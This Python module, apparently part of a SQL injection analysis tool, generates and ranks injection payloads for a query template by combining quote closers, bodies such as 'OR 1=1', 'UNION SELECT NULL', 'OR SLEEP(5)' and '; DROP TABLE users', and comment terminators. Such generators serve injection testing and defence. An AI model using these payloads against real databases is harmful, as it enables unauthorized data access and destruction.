"""SQL injection payload mutation engine."""

from __future__ import annotations

from dataclasses import dataclass, field

from ..models import Context, Risk, SqlDialect
from .context import analyze_sql_context

# Core injection bodies, independent of the surrounding quote.
_BODIES = [
    ("OR 1=1", "boolean"),
    ("OR '1'='1", "boolean"),
    ("AND 1=1", "boolean"),
    ("AND 1=2", "boolean"),
    ("OR SLEEP(5)", "time"),
    ("UNION SELECT NULL", "union"),
    ("UNION SELECT NULL,NULL", "union"),
    ("; DROP TABLE users", "stacked"),
    ("; SELECT 1", "stacked"),
]

# Comment terminators that swallow the rest of the statement.
_TERMINATORS = ["-- ", "#", "/*", ""]

_RISK_ORDER = {
    Risk.CRITICAL: 4,
    Risk.HIGH: 3,
    Risk.MEDIUM: 2,
    Risk.LOW: 1,
    Risk.NONE: 0,
}


@dataclass
class SqlCandidate:
    payload: str
    risk: Risk
    command_injected: bool
    syntax_valid: bool
    strategy: str


@dataclass
class SqlMutationResult:
    template: str
    dialect: SqlDialect
    context: Context
    generated: int
    valid: int
    candidates: list[SqlCandidate] = field(default_factory=list)

    @property
    def high_probability(self) -> list[str]:
        return [c.payload for c in self.candidates[:10]]

    def to_dict(self) -> dict:
        return {
            "template": self.template,
            "dialect": self.dialect.value,
            "context": self.context.value,
            "generated": self.generated,
            "valid": self.valid,
            "high_probability": self.high_probability,
            "candidates": [
                {
                    "payload": c.payload,
                    "risk": c.risk.value,
                    "command_injected": c.command_injected,
                    "syntax_valid": c.syntax_valid,
                    "strategy": c.strategy,
                }
                for c in self.candidates
            ],
        }


def _closers(context: Context) -> list[str]:
    if context == Context.SQL_STRING:
        return ["'", "')", ""]
    if context == Context.SQL_IDENTIFIER:
        return ['"', "`", ""]
    return [""]  # numeric / expression position


def _generate(context: Context) -> list[tuple[str, str]]:
    seen: set[str] = set()
    out: list[tuple[str, str]] = []

    def add(payload: str, strategy: str) -> None:
        if payload not in seen:
            seen.add(payload)
            out.append((payload, strategy))

    for closer in _closers(context):
        for body, strategy in _BODIES:
            for term in _TERMINATORS:
                sep = " " if closer and not closer.endswith(")") else ""
                add(f"{closer}{sep}{body}{term}".rstrip(), strategy)

    return out


def mutate_sql(
    template: str, dialect: SqlDialect = SqlDialect.MYSQL
) -> SqlMutationResult:
    """Generate and rank SQL injection payloads for ``template``."""
    from .analyzer import analyze_sql

    context = analyze_sql_context(template, dialect)
    generated = _generate(context)

    candidates: list[SqlCandidate] = []
    for payload, strategy in generated:
        result = analyze_sql(template, payload, dialect)
        if result.breakout.command_injected:
            candidates.append(
                SqlCandidate(
                    payload=payload,
                    risk=result.risk,
                    command_injected=True,
                    syntax_valid=result.balance.syntax_valid,
                    strategy=strategy,
                )
            )

    candidates.sort(
        key=lambda c: (_RISK_ORDER[c.risk], c.syntax_valid, -len(c.payload)),
        reverse=True,
    )

    return SqlMutationResult(
        template=template,
        dialect=dialect,
        context=context,
        generated=len(generated),
        valid=len(candidates),
        candidates=candidates,
    )
